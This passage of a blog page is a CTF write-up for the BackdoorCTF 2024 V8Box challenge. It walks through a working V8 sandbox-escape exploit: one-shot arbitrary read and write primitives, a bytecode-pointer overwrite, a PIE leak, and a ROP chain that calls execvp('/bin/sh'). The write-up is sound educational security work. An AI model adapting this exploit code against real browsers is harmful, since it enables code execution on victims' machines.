+<li>The second one is <code>Sandbox.leakIsolate</code> basically arbitrary read on isolate heap v8 but only <strong>one time</strong>.  <div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> buf2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf2);</span><br><span class="line"><span class="keyword">let</span> i64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ftoi</span> = x =&gt; &#123;</span><br><span class="line">f64[<span class="number">0</span>] = x;</span><br><span class="line"><span class="keyword">return</span> i64[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">itof</span> = x =&gt; &#123;</span><br><span class="line">i64[<span class="number">0</span>] = x;</span><br><span class="line"><span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="title function_">ftoi</span>(<span class="title class_">Sandbox</span>.<span class="title function_">leakIsolate</span>(<span class="number">0x8</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Leak Isolate: &quot;</span>, leak.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//output : 5555569eb000</span></span><br></pre></td></tr></table></figure></div>
+  <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/v8box/v8box1.png"
+                      alt="v8box"
+                ><br>  As you can see from image above, if we put the offset 8 it will return as the address of isolate heap on v8 which is <code>0x5555569eb000</code>, so if you put the offset to 0 the result will be <code>0x000028c300000000</code>.<br>  With this we can leak any address that availabe on that heap</li>
+<li>The third one is <code>Sandbox.ArbMemoryWrite</code> basically arbitrary write on any address but only <strong>one time</strong> again same like <code>leakIsolate</code>.  <div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Sandbox</span>.<span class="title class_">ArbMemoryWrite</span>(<span class="number">0xdeadbeefn</span>, <span class="number">0xcafebeefn</span>);</span><br></pre></td></tr></table></figure></div>
+  <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/v8box/v8box2.png"
+                      alt="v8box"
+                ></li>
+</ul>
+<p>The vuln is clear here, we got once ARB Read &amp; Write from the <code>vuln.patch</code> now we need to bypass the sandbox using those functions. Since JIT, WASM, etc is disabled we need to find other way to get shell.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>The solution is overwrite JavaScript bytecode, there’s a similiar challenge that solved it that way which is challenge <a class="link"   target="_blank" rel="noopener" href="https://github.com/google/google-ctf/tree/main/2023/quals/sandbox-v8box/solution" >V8box on GoogleCTF 2023<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Javascript-Bytecode"><a href="#Javascript-Bytecode" class="headerlink" title="Javascript Bytecode"></a>Javascript Bytecode</h3><p>V8 is complex javascript engine that running on google chrome, and apparently v8 convert every function into bytecode. So if you create a function like this</p>
+<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">pwn</span>(); <span class="comment">//run it</span></span><br><span class="line">%<span class="title class_">DebugPrint</span>(pwn);</span><br></pre></td></tr></table></figure></div>
+<p>The bytecode will saved in the heap v8 sandbox address, and that address is stored &#x2F; located in Trusted Pointer Table<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/v8box/v8box3.png"
+                      alt="v8box"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/v8box/v8box4.png"
+                      alt="v8box"
+                ><br>And if you call that <code>pwn()</code> function. One of function that will processed the bytecode is <code>Builtins_LdarHandler</code> function, and from the googlectf writeup that function has no bound check, so if we can control the bytecode Ldar it will happily load data from anywhere on the stack.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/v8box/v8box_debug.png"
+                      alt="v8box"
+                ></p>
+<h3 id="Gain-Shell"><a href="#Gain-Shell" class="headerlink" title="Gain Shell"></a>Gain Shell</h3><p>Now we know our goal, the problem is we only have one time ARB Read &amp; Write, so the idea is we use ARB Read to leak address that contain the bytecode of <code>pwn()</code> function and overwrite it with address our backing store address as our fake bytecode. And that target address is this one<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/v8box/v8box5.png"
+                      alt="v8box"
+                ><br>To get that address you can grep address of <code>pwn()</code> bytecode which is <code>0x28770004007d</code> on gef &#x2F; pwndbg.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/v8box/v8box6.png"
+                      alt="v8box"
+                ><br>As you can see from the image above the address <code>0x7fff43610000</code> contain address of <code>pwn()</code> function bytecode address that mean that address is the Trusted Pointer Table address, so we will use our ARB Write to overwrite that address into our backing store address.</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>); <span class="comment">// buffer for storing fake bytecode</span></span><br><span class="line"><span class="keyword">const</span> u8buf = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> memory = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="keyword">new</span> <span class="title class_">Sandbox</span>.<span class="title class_">MemoryView</span>(<span class="number">0</span>, <span class="number">0x100000000</span>));</span><br><span class="line"><span class="keyword">const</span> kHeapObjectTag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> byteCodeTag = <span class="title class_">Number</span>(<span class="number">0x2dn</span> &lt;&lt; <span class="number">48n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getPtr</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="title class_">Sandbox</span>.<span class="title function_">getAddressOf</span>(obj) + kHeapObjectTag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getField</span>(<span class="params">obj, offset</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> memory.<span class="title function_">getUint32</span>(obj + offset - kHeapObjectTag, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setField</span>(<span class="params">obj, offset, value</span>) &#123;</span><br><span class="line">    memory.<span class="title function_">setUint32</span>(obj + offset, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setFieldU64</span>(<span class="params">obj, offset, value</span>) &#123;</span><br><span class="line">  memory.<span class="title function_">setBigUint64</span>(obj + offset, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> off = <span class="number">40</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">emit</span>(<span class="params">x</span>) &#123;</span><br><span class="line">  u8buf[off] = x;</span><br><span class="line">    off++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">reset</span>(<span class="params"></span>) &#123;</span><br><span class="line">    off = <span class="number">40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">pwn</span>(); <span class="comment">// call the pwn function so the bytecode will be stored</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> bc_addr = <span class="title class_">Number</span>(<span class="title class_">BigInt</span>(<span class="title function_">getField</span>(<span class="title function_">getPtr</span>(buf), <span class="number">0x28</span>)) &lt;&lt; <span class="number">8n</span>); <span class="comment">// backing_store</span></span><br><span class="line"><span class="keyword">const</span> bc_addr64 = <span class="title class_">Sandbox</span>.<span class="property">base</span> + bc_addr + <span class="number">0x80</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`tag @ 0x<span class="subst">$&#123;byteCodeTag.toString(<span class="number">16</span>)&#125;</span>`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`fake bytecode @ 0x<span class="subst">$&#123;bc_addr64.toString(<span class="number">16</span>)&#125;</span>`</span>)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">tag @ 0x2d000000000000</span></span><br><span class="line"><span class="comment">fake bytecode @ 0x2c3600000080</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Now we have our backing store address for store our fake bytecode, first we need to copy the original bytecode from <code>pwn()</code> to our backing store address. We can just copy all the value in address <code>0x28770004007d</code></p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bc_struct = [</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x14</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7d</span>, <span class="number">0x44</span>, <span class="number">0x19</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x0b</span>, <span class="number">0x04</span>, <span class="number">0x3f</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x4b</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0xb3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8d</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xfd</span>, <span class="number">0x3a</span>, <span class="number">0x19</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x2e</span>, <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0x00</span>    </span><br><span class="line">  ];</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; bc_struct.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    u8buf[i] = bc_struct[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we need to find the pointer address that cointain address of our <code>pwn()</code> bytecode which is address <code>0x7fff43610000</code>. Luckily the address if found on offset 0x298 so we can you leakIsolate on offset 0x298 to get that address.</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trusted_ptr = <span class="title function_">ftoi</span>(<span class="title class_">Sandbox</span>.<span class="title function_">leakIsolate</span>(<span class="number">0x298</span>)) + <span class="number">0x10000n</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`trusted_ptr @ 0x<span class="subst">$&#123;trusted_ptr.toString(<span class="number">16</span>)&#125;</span>`</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>And now we can overwrite the bytecode address to our backing store address with <code>Sandbox.ArbMemoryWrite</code></p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> target = <span class="title class_">BigInt</span>(byteCodeTag + bc_addr64) + <span class="title class_">BigInt</span>(kHeapObjectTag);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(target.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="title class_">Sandbox</span>.<span class="title class_">ArbMemoryWrite</span>(trusted_ptr+<span class="number">0x50n</span>, target);</span><br></pre></td></tr></table></figure></div>
+
+<p>So if we set breakpoint on function <code>Builtins_LdarHandler</code> then call <code>pwn()</code> again, the pointer will changed to our backing store address.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/v8box/v8box7.png"
+                      alt="v8box"
+                ></p>
+<p>With this we can just follow the solution from <a class="link"   target="_blank" rel="noopener" href="https://github.com/google/google-ctf/blob/main/2023/quals/sandbox-v8box/healthcheck/pwn.js" >V8Box Google CTF 2023<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Leak the PIE address by changing the bytecode to <code>LdarExtraWide</code> then we control the stack by changing the bytecode to <code>Star Frame Pointer</code></p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">reset</span>();</span><br><span class="line"><span class="comment">// ldar a0</span></span><br><span class="line"><span class="title function_">emit</span>(<span class="number">0xb</span>);</span><br><span class="line"><span class="title function_">emit</span>(<span class="number">0x14</span>);</span><br><span class="line"><span class="comment">// ret</span></span><br><span class="line"><span class="title function_">emit</span>(<span class="number">0xb3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d8Leak = <span class="title function_">pwn</span>();</span><br><span class="line"><span class="keyword">if</span> (d8Leak &lt; <span class="number">0</span>) &#123;</span><br><span class="line">  d8Leak = <span class="number">0x100000000</span> + d8Leak;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> bin_base = (<span class="title class_">BigInt</span>(<span class="title class_">Sandbox</span>.<span class="property">getPIELeak</span>) | (<span class="title class_">BigInt</span>(d8Leak) &lt;&lt; <span class="number">1n</span>)) - <span class="number">0x100a85cn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`pie @ 0x<span class="subst">$&#123;bin_base.toString(<span class="number">16</span>)&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">reset</span>();</span><br><span class="line"><span class="comment">// ldar a0</span></span><br><span class="line"><span class="title function_">emit</span>(<span class="number">0xb</span>);</span><br><span class="line"><span class="title function_">emit</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// star frame pointer</span></span><br><span class="line"><span class="title function_">emit</span>(<span class="number">26</span>);</span><br><span class="line"><span class="title function_">emit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ret</span></span><br><span class="line"><span class="title function_">emit</span>(<span class="number">0xb3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fill = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100</span>).<span class="title function_">fill</span>(<span class="number">1.1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fakeStack = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100</span>).<span class="title function_">fill</span>(<span class="number">2.2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fakeStackBuf = <span class="title function_">getPtr</span>(fakeStack);</span><br><span class="line"></span><br><span class="line"><span class="title function_">setFieldU64</span>(fakeStackBuf, -<span class="number">0x20</span>, <span class="title class_">BigInt</span>(bc_addr64) + <span class="number">0x2cn</span>);</span><br><span class="line"><span class="title function_">setField</span>(fakeStackBuf, -<span class="number">0x28</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fakeStackBuf += <span class="number">0x8</span>;</span><br><span class="line"><span class="title function_">setFieldU64</span>(fakeStackBuf, <span class="number">0</span>, bin_base + <span class="number">0x00000000007e8535n</span>); <span class="comment">// pop rdi</span></span><br><span class="line"><span class="title function_">setFieldU64</span>(fakeStackBuf, <span class="number">0x8</span>, <span class="title class_">BigInt</span>(<span class="title class_">Sandbox</span>.<span class="property">base</span> + fakeStackBuf) + <span class="number">0x28n</span>); <span class="comment">// /bin/sh ptr</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">setFieldU64</span>(fakeStackBuf, <span class="number">0x10</span>, bin_base + <span class="number">0x000000000075073en</span>); <span class="comment">// pop rsi</span></span><br><span class="line"><span class="title function_">setFieldU64</span>(fakeStackBuf, <span class="number">0x18</span>, <span class="number">0n</span>); </span><br><span class="line"><span class="title function_">setFieldU64</span>(fakeStackBuf, <span class="number">0x20</span>, bin_base + <span class="number">0x13c13b0n</span>); <span class="comment">// execvp</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">setFieldU64</span>(fakeStackBuf, <span class="number">0x28</span>, <span class="number">0x68732f6e69622fn</span>); <span class="comment">// /bin/sh</span></span><br><span class="line"><span class="title function_">pwn</span>(fakeStack);</span><br></pre></td></tr></table></figure></div>
+
+<p>Now with this we successfully get the shell.<br>For full script you can see it <a class="link"   target="_blank" rel="noopener" href="https://github.com/linz04/PWN-Writeup/blob/international/BackdoorCTF2024/V8box/public/exploit.js" >here<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/v8box/v8box8.png"
+                      alt="v8box"
+                ></p>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/PWN/">#PWN</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Browser-Exploitation/">#Browser Exploitation</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/08/05/2022-06-06-pointytail/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">SeeTF 2022 - Pointytail</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/06/20/CVE-2025-5959/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">CVE-2025-5959</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">BackdoorCTF 2024 - V8Box</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#V8Box"><span class="nav-text">V8Box</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Introduction"><span class="nav-text">Introduction</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Patch-Analysis"><span class="nav-text">Patch Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution"><span class="nav-text">Solution</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Javascript-Bytecode"><span class="nav-text">Javascript Bytecode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gain-Shell"><span class="nav-text">Gain Shell</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Linz</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        5 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
